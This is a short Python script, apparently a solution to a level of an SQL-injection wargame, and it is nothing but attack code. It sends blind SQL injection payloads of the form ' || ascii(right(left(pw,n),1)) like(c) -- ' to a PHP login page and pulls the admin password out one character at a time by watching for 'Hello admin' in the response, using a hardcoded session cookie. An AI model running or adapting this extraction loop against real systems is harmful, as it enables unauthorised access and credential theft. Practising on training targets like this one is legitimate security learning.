import requests

password=''
for admin_len in range(8) :
    for admin_pass in range(48,122) :
        URL='http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?'
        query={'pw': '\' || ascii(right(left(pw,'+str(admin_len+1)+'),1))like('+str(admin_pass)+') -- '}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        cookies = {'PHPSESSID': 'ean08as37ebof2v307j3kurer3'}
        res=requests.get(URL, params=query, headers=headers, cookies=cookies)
        if("Hello admin" in res.text):
            print(chr(admin_pass))
            break
    print("one cycle complete")